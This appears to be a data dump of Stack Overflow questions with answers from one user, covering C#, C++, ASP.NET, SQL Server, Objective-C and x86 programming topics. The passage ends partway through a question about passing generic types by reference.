","33708","","<p>A <code>static</code> member belongs to a type rather than a specific instance of a type. It doesn't matter whether you have no instances of a class or you create a million instances when it comes to <code>static</code> members. Only <strong>one</strong> will exist. This is not the case for instance variables. Basically, each instance you create has its own specific instance variables. This is why you can't access instance members in static contexts without an object instance. It's not clear the instance member you want to access belongs to which object. You can, however, reference instance members in static contexts by specifying an object reference explicitly:</p>

<pre><code>obj.instanceMember // valid in static context as `obj` specifies the object
</code></pre>
"
"<p>So, I know that there is a difference between these two tidbits of code:</p>

<pre><code>template &lt;typename T&gt;
T inc(const T&amp; t)
{
    return t + 1;
}

template &lt;&gt;
int inc(const int&amp; t)
{
    return t + 1;
}
</code></pre>

<p>and</p>

<pre><code>template &lt;typename T&gt;
T inc(const T&amp; t)
{
    return t + 1;
}

int inc(const int&amp; t)
{
    return t + 1;
}
</code></pre>

<p>I am confused as to what the functional differences between these two are. Can someone show some situations where these snippits act differently from each other?</p>
","33708","","<p>Template specialization is more generic than just overloading. You can specialize things like classes rather than just simple functions. Overloading only applies to functions.</p>

<p><strong>UPDATE:</strong> To clarify more per AraK's comment, you are really comparing apples and oranges here. Function overloading is used to introduce the ability to have different functions share a single name, if they have different signatures. Template specialization is used to define a specific code snippet for a specific type parameter. You can't have a template specialization if you don't have a template. If you remove the first piece of code that declares the generic template, you'll receive a compile time error if you try to use template specialization. </p>

<p>So, the goal of template specialization is pretty different from a function overload. They just happen to behave similarly in your example while they are fundamentally different. </p>

<p>If you provide an overload, you are declaring an independent method that happens to have the same name. You are not preventing the template to be used with the specific type parameter. To demonstrate this fact, try:</p>

<pre><code>template &lt;typename T&gt;
T inc(const T&amp; t)
{
    return t + 1;
}

int inc(const int&amp; t)
{
    return t + 42;
}

#include &lt;iostream&gt;
int main() {
   int x = 0;
   x = inc&lt;int&gt;(x);
   std::cout &lt;&lt; ""Template: "" &lt;&lt; x &lt;&lt; std::endl; // prints 1.

   x = 0;
   x = inc(x);
   std::cout &lt;&lt; ""Overload: "" &lt;&lt; x &lt;&lt; std::endl; // prints 42.
}
</code></pre>

<p>As you can see, in this example, there are two distinct <code>inc</code> functions for <code>int</code> values: <code>inc(const int&amp;)</code> and <code>inc&lt;int&gt;(const int&amp;)</code>. You couldn't expand the generic template using <code>int</code> if you had used template specialization.</p>
"
"<p>We are developing a web application (ASP.NET) for a bank, and it uses SQL Server 2005. The bank will have to buy a license for SQL Server 2005.</p>

<p>The question is - <strong>which SQL Server 2005 version / license</strong> will be the <strong>least expensive</strong> for such purposes?</p>

<p>1) It seems that the SQL Server Express version which is totally free can do. However, it also seems that this version has limitations as to the exporting and importing of data, so this may be not the best choice.</p>

<p>2) There is a ""<strong>client access license</strong>"" (<strong>CAL</strong>) licencing model in SQL Server. In an ASP.NET application, it is possible to access data using the ASP.NET system user (although the web application may have hundreds or thousands of users). In this case, will it be enough to have an SQL Server license <strong>for just 1 user</strong> (the <strong>ASP.NET system user</strong> accessing the data)? If yes, this is probably the most cost-efficient solution.</p>
","33708","","<ol>
<li><p>SQL Server Express has some limitations but I don't know what you exactly mean by importing and exporting data. It does well for most small apps. I would consider the features I use in the application and the database size/CPU/memory requirement to see if SQL Server Express is applicable or not.</p></li>
<li><p>No, you can't use a single CAL for a <a href=""http://www.microsoft.com/sqlserver/2008/en/us/licensing-faq.aspx"" rel=""nofollow"">Web application</a>.</p>

<blockquote>
  <p>For externally focused server applications. Processor licensing is a better choice for externally focused server applications, <strong>such as Internet and extranet scenarios</strong>. It is often difficult to count devices or users in these scenarios, so hardware-based pricing is more straightforward.
  <hr />
  Also noted <a href=""http://download.microsoft.com/download/1/e/6/1e68f92c-f334-4517-b610-e4dee946ef91/2008%20SQL%20Licensing%20Overview%20final.docx"" rel=""nofollow"">here</a>:<br />
  Multiplexing: Use of Middleware, Transaction Servers, and Multitiered architectures
  Sometimes organizations develop network scenarios that use various forms of hardware and/or software that reduce the number of devices or users that directly access or use the software on a particular server, often called multiplexing or pooling hardware or software. Use of such multiplexing or pooling hardware and/or software does not reduce the number of CALs required to access or use SQL Server software. A CAL is required for each distinct device or user that is connected to the multiplexing or pooling software or hardware front end.</p>
</blockquote></li>
</ol>

<p>I suggest you consider <a href=""http://www.microsoft.com/sqlserver/2008/en/us/web.aspx"" rel=""nofollow"">SQL Server 2008 Web Edition</a></p>
"
"<blockquote>
  <p><strong>Possible Duplicate:</strong><br>
  <a href=""http://stackoverflow.com/questions/1051379/is-there-a-difference-in-c-between-copy-initialization-and-assignment-initializ"">Is there a difference in C++ between copy initialization and assignment initialization?</a>  </p>
</blockquote>

<p>I am new to C++, I seldom see people using this syntax to declare and initialize a variable: </p>

<pre><code>int x(1);
</code></pre>

<p>I tried, the compiler did not complain and the output is the same as int x=1, are they actually the same thing?</p>

<p>Many thanks to you all.</p>
","33708","","<p>For POD-types, both statements are identical.</p>
"
"<p>I provide a library that currently has .NET 2.0 as a pre-requisite.<br />
I'd like to go to .NET 3.5, to take advantage of LINQ, and Action delegates, and so on, but I don't want to strand too many people. 
Now that 4.0 is nearing release, is it time to move up to 3.5? </p>

<p>The library works on the desktop and CF versions of the Framework. </p>

<p>Does anyone know - What are the adoption numbers of the various versions of the framework?</p>
","33708","","<p>While going with 3.5 is a good option in most cases, you can take advantages of LINQ using C# 3.0 compiler and .NET 2.0 with <a href=""http://www.albahari.com/nutshell/linqbridge.aspx"" rel=""nofollow"">LINQBridge</a>.</p>

<p>Note that while .NET 4.0 is going to be released in a near future, .NET 3.5 is preinstalled on Windows 7, which makes it more available considering wide speculated deployments of Windows 7.</p>

<p>And if you stay with .NET 2.0, you can take advantage of the Windows Vista install base which contains .NET 3.0 out of the box.</p>
"
"<p>What makes smartpointers better than normal pointers?</p>
","33708","","<p>Automatic reference counting and deallocation.</p>
"
"<p>When you create a new anonymous object using the following syntax:</p>

<pre><code>string name = ""Foo"";
var myObject = new { name };
</code></pre>

<p>You get an object with a property named 'name':</p>

<pre><code>myObject.name == ""Foo""; //true
</code></pre>

<p>What method does C# use to extract the variable name?</p>
","33708","","<p>Basically, that expression is equivalent to</p>

<pre><code>new { name = name }
</code></pre>

<p>since no explicit property name is provided.</p>

<p>The C# compiler generates a class at compile time with a <code>name</code> property. It infers the property name from the variable name (which it obviously sees). Everything is statically typed at compile time. Nothing special is performed at run time (except initialization of the anonymous class instance). No method is called on anything.</p>
"
"<p>Some old x86 instructions are undefined in 64-bit mode.  For instance <code>LDS</code>, <code>LES</code> and <code>LSS</code>, or short opcodes of the <code>INC r16</code> (<code>40 + <em>rw</em></code>) and <code>INC r32</code> (<code>40 + <em>rd</em></code>) instructions.</p>

<p>Are there any instructions that are defined only in 64-bit mode, and not in 32-bit protected mode?</p>

<p><strong>Edit:</strong>  The context is development of an x86 processor.  I want to make sure I'm compatible to the spec.</p>
","33708","","<p>Setting aside old instructions that now operate on 64 bit registers (they are really new instructions as they use a distinct binary representation), I can think of at least two instructions that are 64-bit only: <code>syscall</code> and <code>sysret</code> instructions.</p>
"
"<p>What is the <em>precise</em> implementation of Enumerable.Range in .Net; preferable .Net 4? Is it a yielded for-loop? A custom implementation (IEnumerable, IEnumerator) or?</p>
","33708","","<p>You can use <a href=""http://www.red-gate.com/products/reflector/"" rel=""nofollow"">Reflector</a> to see the implementation for yourself. It checks arguments and throws exception at the time of calling, so the <code>Range</code> method itself is not an iterator method. It calls another method which is an iterator method. It's not OK to post the exact code due to <a href=""http://meta.stackexchange.com/questions/20153/posting-code-from-reflector/20155#20155"">license restrictions</a>.</p>
"
"<p>When calling methods on a base class from a derived class, should the 'base' keyword be used? It seems using the base keyword would increase code readability but for me so far, when I exclude it, there is no affect on code compilation and execution.</p>
","33708","","<p>It does matter if you have <code>overridden</code> a method:</p>

<pre><code>class Test { 
   public override string ToString() { return ""Hello World""; }
   public string M1() { return ToString(); } // Test.ToString
   public string M2() { return base.ToString(); } // System.Object.ToString
   static void Main() { 
       var t = new Test();
       Console.WriteLine(""M1: {0}"", M1()); // Hello World
       Console.WriteLine(""M2: {0}"", M2()); // Test
   }
}
</code></pre>
"
"<p>I am using .Net Remoting to handle intra-process communication between a master service and numerous (sometimes 50+) instances of a small client library. From a security standpoint, it is imperative that the service only accepts connections from the local machine, and noone else -- yet I cannot find any information on how one does this, and the MSDN docs don't seem to be much help.</p>

<p>Preferably, I'd like to keep connections bound to localhost in a way that will not set off users' firewall alerts... but this isn't required functionality.</p>

<p>Thank you for your help!</p>

<p>Tom</p>
","33708","","<p>Use an <a href=""http://msdn.microsoft.com/en-us/library/system.runtime.remoting.channels.ipc.ipcchannel.aspx"" rel=""nofollow""><code>IpcChannel</code></a> if you are on .NET 2.0+. It's designed for inter-process communications and doesn't use TCP at all.</p>
"
"<p>I am thinking about going into .net framework client profile, but currently I am depending on System.Design.dll, which is not inside the profile.</p>

<p>I can, of course, manually distribute them in my application folder directory, but is there a better strategy?</p>
","33708","","<p>I don't think you are legally permitted to distribute individual .NET Framework DLLs. If you depend on a DLL that's not part of the client profile, either get rid of the dependency somehow or don't target the client profile; consider requiring the full .NET Framework.</p>
"
"<p>I have used the single ampersand (&amp;) in C# to mean ""check the <strong>second</strong> conditional statement even if the first is <strong>false</strong>"". </p>

<p>But the following seems to be a <strong>different meaning</strong> of <code>&amp;</code> altogether, can anyone explain how <code>i &amp; 1</code> works in the following example?</p>

<pre><code>List&lt;int&gt; scores = new List&lt;int&gt; { 1, 2, 3, 4, 5, 6, 7, 8 };
var evenScores = scores.Where(i =&gt; i % 2 == 0);
var evenScores2 = scores.Where(i =&gt; (i &amp; 1) == 0);
</code></pre>
","33708","","<p>For boolean types, what you mentioned is how it behaves. </p>

<p>For integer types, it's the bitwise ""and"" operator. </p>

<p>It can be overloaded for other types.</p>

<p>Basically, the expression <code>(i &amp; 1) == 0</code> checks to see whether the least significant bit of <code>i</code> is set, which only happens if the number is odd.</p>
"
"<p>I'm working on a hobby project of the game <a href=""http://en.wikipedia.org/wiki/Baroque%5Fchess"" rel=""nofollow"">Baroque Chess</a>. For those that haven't played it, it has the same basic rules as chess, but the methods for movement and capturing are different.</p>

<p>Naturally I created standard classes for the game: <code>GameState</code>, <code>Board</code>, <code>Square</code>, and a class designated for each piece that inherit from a <code>BasePiece</code>.</p>

<p>Each piece has 2 main virtual methods, <code>GetPossibleMoves(Board board)</code> and <code>GetCapturedSquares(Board board, Square toSquare)</code>.</p>

<p>Now, one of the pieces, <a href=""http://en.wikipedia.org/wiki/Baroque%5Fchess#Chameleon.2FImitator"" rel=""nofollow"">the Imitator</a>, captures pieces by ""imitating"" the piece that it captures. For example, a Long Leaper can capture pieces by jumping over them. This means that the Imitator can jump over enemy Long Leapers to capture them (but cannot jump anything else).</p>

<p>I completed the <code>GetCapturedSquares()</code> functionality for all the pieces except the Imitator (which is definitely the trickiest of the pieces).</p>

<p>My basic algorithm for the Imitator was: </p>

<ul>
<li>find all the squares with enemy pieces on them</li>
<li>for each enemy piece...
<ul>
<li>create a simulated piece in the same location as the Imitator</li>
<li>find the valid captures if it were the simulated piece moving to a chosen square</li>
<li>verify the enemy square is in that list of captured squares</li>
</ul></li>
</ul>

<p>Since I had already written the code for the other pieces' movements, I figured I would just instantiate new pieces and use their <code>GetCapturedSquares()</code> methods depending on which type of piece the enemy was. To do this, I setup up a <code>Dictionary</code> as you can see here that maps a <code>System.Type</code> to an instantiated object of said type:</p>

<pre><code>var typeToPiece = new Dictionary&lt;Type, BasePiece&gt;() 
{
    {typeof(Pincer), new Pincer() { Color = this.Color, CurrentSquare = this.CurrentSquare}},
    {typeof(Withdrawer), new Withdrawer() { Color = this.Color, CurrentSquare = this.CurrentSquare }},
    {typeof(Coordinator), new Coordinator() { Color = this.Color, CurrentSquare = this.CurrentSquare }},
    {typeof(LongLeaper), new LongLeaper() { Color = this.Color, CurrentSquare = this.CurrentSquare }},
    {typeof(King), new King() { Color = this.Color, CurrentSquare = this.CurrentSquare }},
};
//...
var possibleMoves = typeToPiece[enemySquare.Occupant.GetType()].GetPossibleMoves(board, toSquare);
</code></pre>

<p>Doing this makes me feel dirty inside. Is it more appropriate to create an <code>enum</code> or <code>string</code> that represents the piece type as the dictionary key, or does it really not matter? Is there a different way to handle this? I am of the opinion that it's fine just the way it is but I am interested in hearing your thoughts.</p>
","33708","","<p>I think you should add an <code>abstract</code> method to <code>BasePiece</code> that ""clones"" the current piece and returns the simulated piece.</p>

<p>You'd <code>override</code> this method in every piece type. To share code between them, you can add a <code>protected</code> method to the base class that copies the shared properties to the instance passed to it:</p>

<pre><code>abstract class BasePiece {
   protected BasePiece(BasePiece pieceToClone) {
      this.Color = pieceToClone.Color;
      this.CurrentSquare = pieceToClone.CurrentSquare;
   }
   public abstract BasePiece GetSimulatedClone();
}

class King : BasePiece {
   protected King(King pieceToClone) : base(pieceToClone) { }
   public King() { }
   public override BasePiece GetSimulatedClone() {
       return new King(this);
   }
}
</code></pre>

<p>In general, whenever you are switching based on the type of a variable, you should think twice and see if you can polymorphism instead. </p>
"
"<p>I have a function that needs to return two strings. I've considered two different ways to do this:</p>

<pre><code>string first = ""this is first"";
string second = ""this is second"";
KeyValuePair&lt;string, string&gt; ReturnPair()
{
    return new KeyValuePair&lt;string, string&gt;(first, second);
}
string ReturnOne(out string other)
{
    other = second;
    return first;
}
</code></pre>

<p>I would like to use the KeyValuePair&lt;> approach but I feel that I am misusing the purpose for which this object was created.</p>

<p>My questions:</p>

<ol>
<li>Is there a better way to return 2 strings in this example? </li>
<li>Is there anything wrong with returning the KeyValuePair?</li>
</ol>
","33708","","<p>While there's nothing <em>technically</em> wrong with returning <code>KeyValuePair</code>, the thing you are returning is not <em>conceptually</em> a ""key-value"" pair. It's a simple pair. </p>

<p>Alternatively you can use a <code>Tuple</code>, which is available in .NET 4.0 or in the meantime, declare <a href=""http://stackoverflow.com/questions/1099134/what-is-the-best-way-to-return-two-lists-in-c/1099154#1099154"">your own structure</a>.</p>

<p>I normally advice against <code>out</code> parameters for returning tuples. Specially when you are using LINQ and functional language constructs, working with <code>out</code> parameters is tedious.</p>
"
"<p>I know that you have to do it like this:</p>

<pre><code>int * p;
p = new int[10];

//use array

delete [] p;
</code></pre>

<p>Now my question is: Since it's not explicitly stated, how is it possible that the correct amount of memory is freed? Do  the OS keep track of the allocated memory and its starting address?</p>
","33708","","<p>The runtime library will keep track of allocated blocks of memory. It's guaranteed to deallocate the block correctly, given the initial pointer returned by <code>new</code>.</p>

<p>While this <em>can</em> be implemented in the OS itself (theoretically), it normally isn't. What the OS keeps track of is the pages allocated to a process as a whole, not individual blocks allocated at this level of abstraction.</p>
"
"<p>Is it wrong to pinvoke user32.dll on 64 bit Windows, from a 64 bit app?  I've done this successfully a number of times and never had an error, but it seems contradictory.  Should I look for user64.dll instead?</p>
","33708","","<p>The name <code>user32.dll</code> is misleading. It's the 64 bit version of <code>user32.dll</code> you're calling. The 64 bit version is located at <code>%windir%\System32\user32.dll</code>.</p>

<p>A 32-bit version is included for compatibility with 32-bit applications. It's located at <code>%windir%\SysWOW64\user32.dll</code>. You can inspect them using the <code>dumpbin</code> utility:</p>

<p>System32\user32.dll:</p>

<pre><code>FILE HEADER VALUES
        8664 machine (x64)
</code></pre>

<p>SysWOW64\user32.dll:</p>

<pre><code>FILE HEADER VALUES
         14C machine (x86)
</code></pre>
"
"<p>Will declaring a dataset as STATIC in ASP.net website help in persisting data across post backs?</p>

<p>I was looking at an application and somehow a static dataset was able to persist the data even if we closed the application and opened it again.</p>
","33708","","<p>Yes, it can. <code>static</code> variables are stored in server memory. Note that they are <strong>shared among all users</strong> (like <code>Application</code> state) and it might require a locking mechanism to ensure thread safety. </p>

<p>Note that it will be gone if the application ends.</p>
"
"<p>I have been trying to whip up a quick and dirty application. This application needs to support user authentication. To accomplish this, I thought I could rely on the built in Login control and utilize the credentials ability of the web.config like so:</p>

<pre><code>&lt;authentication mode=""Forms""&gt;
  &lt;forms defaultUrl=""/authenticated/menu.aspx"" loginUrl=""Default.aspx""&gt;
    &lt;credentials passwordFormat=""Clear""&gt;
      &lt;user name=""user1"" password=""p@ssw0rd"" /&gt;  
    &lt;/credentials&gt;
  &lt;/forms&gt;
&lt;/authentication&gt;
</code></pre>

<p>However, it seems the Login control requires a Membership Provider. I have the following two questions:</p>

<ol>
<li>Does a membership provider that works with the web.config exist? if so, where? I haven't been able to find one?</li>
<li>Is it possible to login to a web application using the credentials in the web.config?</li>
</ol>

<p>Thank you!</p>
","33708","","<p>There's no built in membership provider for <code>Web.config</code>. You can manually validate the credentials using the <a href=""http://msdn.microsoft.com/en-us/library/system.web.security.formsauthentication.authenticate.aspx"" rel=""nofollow"">FormsAuthentication.Authenticate</a> method.</p>
"
"<p>I need to read the binary data (a file that is uploaded) from a form that is posted to a classic asp page. I need to do this without using a component.</p>

<p>How do you read the binary data for that specific file? Note that there could be other non binary fields that need to be read as well.</p>

<p>(updated to clarify)</p>
","33708","","<p>Use <code>Request.BinaryRead</code> method:</p>

<pre><code>byteSafeArray = Request.BinaryRead(Request.TotalBytes)
</code></pre>
"
"<p>I came across this piece of code today:</p>

<pre><code>public static byte[] ReadContentFromFile(String filePath)
{
    FileInfo fi = new FileInfo(filePath);
    long numBytes = fi.Length;
    byte[] buffer = null;
    if (numBytes &gt; 0)
    {
        try
        {
            FileStream fs = new FileStream(filePath, FileMode.Open);
            BinaryReader br = new BinaryReader(fs);
            buffer = br.ReadBytes((int)numBytes);
            br.Close();
            fs.Close();
        }
        catch (Exception e)
        {
            System.Console.WriteLine(e.StackTrace);
        }
    }
    return buffer;
}
</code></pre>

<p>My first thought is to refactor it down to this:</p>

<pre><code>public static byte[] ReadContentFromFile(String filePath)
{
    return File.ReadAllBytes(filePath);
}
</code></pre>

<p><a href=""http://msdn.microsoft.com/en-us/library/system.io.file.readallbytes.aspx"" rel=""nofollow"">System.IO.File.ReadAllBytes</a> is documented as:</p>

<blockquote>
  <p>Opens a binary file, reads the
  contents of the file into a byte
  array, and then closes the file.</p>
</blockquote>

<p>... but am I missing some key difference? </p>
","33708","","<p>That's basically the same method if you add the <code>try {...} catch{...}</code> block. The method name, <code>ReadContentFromFile</code>, further proves the point.</p>

<p>What a minute... isn't that something a unit test should tell?</p>
"
"<p>I have a class that builds a url with query string parameters and so on. The class has a method: Url() which returns the complete url composed from the class properties and another method: UrlNew() which allows passing a predicate as parameter for the replacement of the value of one of the properties and THEN Returns the modified URL. Now, I need to modify this function to use TWO parameters, both predicates. How do I do that? I tried modifying the method's parameters as a List of predicates but I probably am not doing something right:</p>

<p>My OLD UrlNew() method looked like this:</p>

<pre><code>public static string Url() (Action&lt;LGUrlBuilder&gt; predicate)
    {
        var instance = new LGUrlBuilder();
        if (predicate != null) predicate(instance);
        return instance.BuildUrl();
    }
</code></pre>

<p>My NEW UrlNew() method looks like this:</p>

<pre><code>public static string UrlNew(List&lt;Action&lt;LGUrlBuilder&gt;&gt; predicateList)
    {
        var instance = new LGUrlBuilder();
        if (predicateList != null &amp;&amp; predicateList.Count &gt; 0)
        {
            foreach (Action&lt;LGUrlBuilder&gt; predicate in predicateList)
            {
                if (predicate != null) predicate(instance);
            }
        }

        return instance.BuildUrl();
    }
</code></pre>

<p>This compiles just fine but when I run it, using it in ASPX gives me this error:</p>

<pre><code>CS1660: Cannot convert lambda expression to type 'System.Collections.Generic.List&lt;System.Action&lt;public_site.Library.LG.LGUrlBuilder&gt;&gt;' because it is not a delegate type
</code></pre>

<p>I am a C# beginner and I am sure I am doing something completely wrong. Any advice would help. Thanks!</p>
","33708","","<p>Don't modify the function itself. Modify the method call like this:</p>

<pre><code>UrlNew(x =&gt; { func1(x); func2(x); });
</code></pre>

<p>But if you <em>really</em> want to take arbitrary number of delegate instances as arguments, try modifying it like:</p>

<pre><code>public static void UrlNew(params Action&lt;LGUrlBuilder&gt;[] list) {
    // ... do what you're already doing in the second snippet ...
}
</code></pre>

<p>You can call it like:</p>

<pre><code>UrlNew(x =&gt; firstthing(), x =&gt; secondthing(x), thirdthing);
</code></pre>

<p>Side note: An <code>Action&lt;T&gt;</code> is not called a predicate. A predicate returns a boolean value.</p>
"
"<p>Maybe I have to use some options in csc command line ?</p>
","33708","","<p>You should use the <a href=""http://msdn.microsoft.com/en-us/library/tt0cf3sx%28VS.80%29.aspx"" rel=""nofollow"">TlbImp.exe</a> utility to generate an interop assembly from the COM type library and add a reference to the generated assembly with <code>/r</code> compiler switch.</p>
"
"<p>I'm rather confused about properties and instance variables in Objective-C.</p>

<p>I'm about half-way through Aaron Hillegass's ""Cocoa Programming for Mac OS X"" and everything is logical. You would declare a class something like this:</p>

<pre><code>@class Something;

@interface MyClass : NSObject {
    NSString *name;
    NSArray *items;

    Something *something;

    IBOutlet NSTextField *myTextField;
}

@property (nonatomic, retain) NSString *name;
@property (nonatomic, retain) NSArray *items;
</code></pre>

<ul>
<li><p>Since other objects need to manipulate our <code>name</code> and <code>items</code> instance variables, we use <code>@property</code>/<code>@synthesize</code> to generate accessors/mutators for them. Within our class, we don't use the accessors/mutatorsâwe just interact with the instance variable directly.</p></li>
<li><p><code>something</code> is just an instance variable that we're going to use in our class, and since no one else needs to use it, we don't create a pair of accessors and mutators for it.</p></li>
<li><p>We need to interact with a text field in our UI, so we declare an <code>IBOutlet</code> for it, connect it, and we're done.</p></li>
</ul>

<p>All very logical.</p>

<p>However, in the iPhone world, things seem to be different. People declare properties for every single instance variable, declare properties for <code>IBOutlets</code>, and use accessors/mutators to interact with instance variables <strong>within</strong> the class (e.g. they would write <code>[self setName:@""Test""]</code> rather than <code>name = @""Test""</code>).</p>

<p>Why? What is going on? Are these differences iPhone-specific? What are the advantages of declaring properties for all instance variables, declaring properties for <code>IBOutlets</code>, and using accessors/mutators within your own class?</p>
","33708","","<p>In the iPhone world, there's no garbage collector available. You'll have to carefully manage memory with reference counting. With that in mind, consider the difference between:</p>

<pre><code>name = @""Test"";
</code></pre>

<p>and</p>

<pre><code>self.name = @""Test"";
// which is equivalent to:
[self setName: @""Test""];
</code></pre>

<p>If you directly set the instance variable, without prior consideration, you'll lose the reference to the previous value and you can't adjust its retain count (you should have <code>release</code>d it manually). If you access it through a property, it'll be handled automatically for you, along with incrementing the retain count of the newly assigned object.</p>

<p>The fundamental concept is not iPhone specific but it becomes crucial in an environment without the garbage collector.</p>
"
"<p>like say I want to make a method in my repository like</p>

<pre><code>public IQueryable&lt;Item&gt; GetAllItemsByRange(int start, int end)
</code></pre>

<p>and then I just want to pass like (1, 100), (101, 200), (201, 300), etc so I can get back ONLY that range without having to get EVERYTHING at once</p>

<p>thanks!</p>
","33708","","<pre><code>queryable.Skip(start - 1).Take(end - start + 1)
</code></pre>
"
"<p>Is there any way to select, for example, first 10 rows of a table in T-SQL (working MSSQL)?<br>
I think I saw something in Oracle defined as rownum meta variable, used in a following way
<PRE>
select * from Users where rownum&lt;=10
</pre>
But what about MSSQL?</p>
","33708","","<pre><code>select top(@count) * from users
</code></pre>

<p>If <code>@count</code> is a constant, you can drop the parentheses:</p>

<pre><code>select top 42 * from users
</code></pre>

<p>(the latter works on SQL Server 2000 too, while the former requires at least 2005)</p>
"
"<p>Is SearchString acting as property of Page class?
Here is code,</p>

<pre><code>&lt;%@ Page Language=""C#"" %&gt;
&lt;!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd""&gt;
&lt;script runat=""server""&gt;

    public string SearchString
    {
        get { return txtSearch.Text; }
    }

&lt;/script&gt;
&lt;html xmlns=""http://www.w3.org/1999/xhtml"" &gt;
&lt;head id=""Head1"" runat=""server""&gt;
    &lt;title&gt;Button Search Typed&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;form id=""form1"" runat=""server""&gt;
    &lt;div&gt;

    &lt;asp:Label
        id=""lblSearch""
        Text=""Search:""
        Runat=""server"" /&gt;
    &lt;asp:TextBox
        id=""txtSearch""
        Runat=""server"" /&gt;
    &lt;asp:Button
        id=""btnSearch""
        Text=""Go!""
        PostBackUrl=""ButtonSearchResultsTyped.aspx""
        Runat=""server"" /&gt;
    &lt;/div&gt;
    &lt;/form&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
","33708","","<p>It's a property of the class generated for your ASPX file, which inherits from <code>System.Web.UI.Page</code>. It's not added to that class itself, of course.</p>
"
"<p>Comparing the two data models in an asp.net MVC app, which provides better performance, LINQ 2 SQL or LINQ 2 Entities.</p>

<p>They don't always perform the same database operations when you use the same methods, or have the same LINQ methods for that matter....</p>
","33708","","<p>You should benchmark the specific query yourself. However, LINQ to Entities provides an extra abstraction layer in comparison to LINQ to SQL which is likely to impede performance a little.</p>

<p>Performance issues aside, if your application is expected to work with SQL Server backends only and you need a one to one mapping between entities and tables, LINQ to SQL is simpler to use.</p>
"
"<p>I'm currently writing a quick custom encoding method where I take a stamp a key with a number to verify that it is a valid key.</p>

<p>Basically I was taking whatever number that comes out of the encoding and multiplying it by a key.</p>

<p>I would then multiply those numbers to the deploy to the user/customer who purchases the key. I wanted to simply use (Code % Key == 0) to verify that the key is valid, but for large values the mod function does not seem to function as expected.</p>

<p>Number = 468721387;
Key = 12345678;
Code = Number * Key;</p>

<p>Using the numbers above:
Code % Key == 11418772</p>

<p>And for smaller numbers it would correctly return 0. Is there a reliable way to check divisibility for a long in .NET?</p>

<p>Thanks!</p>

<p>EDIT:
Ok, tell me if I'm special and missing something...</p>

<pre><code>        long a = DateTime.Now.Ticks;
        long b = 12345;
        long c = a * b;
        long d = c % b;
        d == 10001 (Bad)
</code></pre>

<p>and </p>

<pre><code>        long a = DateTime.Now.Ticks;
        long b = 12;
        long c = a * b;
        long d = c % b;
        d == 0 (Good)
</code></pre>

<p>What am I doing wrong?</p>
","33708","","<p>Apparently, your <code>Code</code> fails to fit in the <code>int</code> data type. Try using <code>long</code> instead:</p>

<pre><code>long code = (long)number * key;
</code></pre>

<p>The <code>(long)</code> cast is necessary. Without the cast, the multiplication will be done in 32-bit integer form (assuming <code>number</code> and <code>key</code> variables are typed <code>int</code>) and the result will be casted to <code>long</code> which is not what you want. By casting one of the operands to <code>long</code>, you tell the compiler to perform the multiplication on two <code>long</code> numbers.</p>
"
"<p>I've added some extension methods for strings to make working with some custom enums easier.</p>

<pre><code>public static Enum ToEnum&lt;T&gt;(this string s)
{
    return (Enum)Enum.Parse(typeof(T), s);
}

public static bool IsEnum&lt;T&gt;(this string s)
{
    return Enum.IsDefined(typeof(T), s);
}
</code></pre>

<p>Note -- because of limitations of generic type constraints, I have to write the methods like the above.  I would love to use T ToEnum(this string s) where T: Enum to avoid the cast after making the call ... but no can do.</p>

<p>In any event, I figured it would be nice to extend this concept a little bit to return Enum? in those instances where a method signature can accept various nullable enums.</p>

<pre><code>public static Enum? ToEnumSafe&lt;T&gt;(this string s)
{
    return (IsEnum&lt;T&gt;(s) ? (Enum)Enum.Parse(typeof(T), s) : null);
}
</code></pre>

<p>However, this is a no-go due to compiler errors.</p>

<pre><code>error CS0453: The type 'System.Enum' must be a non-nullable value type in order to use it as parameter 'T' in the generic type or method 'System.Nullable&lt;T&gt;'
</code></pre>

<p>I have to admit I'm a bit confused here as Enum? should be a legitimate return value, no?.  I tried something similar, but end up with the same error.</p>

<pre><code>public static T? ToEnumSafe&lt;T&gt;(this string s)
{
    return (IsEnum&lt;T&gt;(s) ? (T)Enum.Parse(typeof(T), s) : null);
}
</code></pre>

<p>I even decided to rewrite the methods to remove the generics and I get more of the same:</p>

<pre><code>public static bool IsEnum(this string s, Type T)
{
    return Enum.IsDefined(T, s);
}
public static Enum? ToEnumSafe(this string s, Type T)
{
    return (IsEnum(s, T) ? (Enum)Enum.Parse(T, s) : null);
}
</code></pre>

<p>Am I missing something really stupid here?</p>
","33708","","<p>Try:</p>

<pre><code>public static T? ToEnumSafe&lt;T&gt;(this string s) where T : struct
{
    return (IsEnum&lt;T&gt;(s) ? (T?)Enum.Parse(typeof(T), s) : null);
}
</code></pre>
"
"<p>Using the following doesn't work:</p>

<pre><code>- (NSString *)stringByReplacingOccurrencesOfString:(NSString *)target withString:(NSString *)replacement
</code></pre>

<p>By doesn't work I mean does not do any replacement what so ever. It returns the same exact string.</p>

<p>Is there a convenience method to do this? Similar to:</p>

<pre><code>- (NSString *)stringByReplacingPercentEscapesUsingEncoding:(NSStringEncoding)encoding
</code></pre>

<p>My code (just one line):</p>

<pre><code>NSString *escapedPath = [pathToBeConverted stringByReplacingOccurrencesOfString:@"" "" 
                                                                     withString:@""\ ""];
</code></pre>

<p>Also, my compiler warning. Which likely has much to do with this:</p>

<pre><code>warning: unknown escape sequence: '\040'
</code></pre>
","33708","","<p>You should use <code>@""\\ ""</code> instead of <code>@""\ ""</code>. In C <code>\</code> is the escape character. You need to escape it with another <code>\</code>.</p>
"
"<p>I have data formatted ""2009-07-17T00:00:00-05:00"" in varchar variable. How can I convert this data to datetime field in MS SQL server using query or TSQL?</p>
","33708","","<p>If you are on SQL Server 2008, you can use the <code>datetimeoffset</code> type:</p>

<pre><code>select cast('2009-07-17T00:00:00-05:00' as datetimeoffset)
</code></pre>

<p>Since you are on 2005, <code>datetimeoffset</code> data type is not available for you. You should decide if you want to keep time zone information separately. If you just want the <code>datetime</code> part, just strip the time zone part from the string and cast it as a <code>datetime</code>: </p>

<pre><code>select cast(left('2009-07-17T00:00:00-5:00', 19) as datetime)
</code></pre>
"
"<p>I am having some troubles passing a reference to an object which is of generic type. I have found a way around by creating a 'Object' and passing a reference to that rather than the original - but it seems to smell a bit to me. Is there a better way here or do I have to live with it?</p>

<p>I understand the first error but the second eludes me.</p>

<pre><code>public static T Foo&lt;T&gt;(ref T Bar)
{
    T Result;

    // Next line gives
    // cannot convert from 'ref T' to 'ref object'
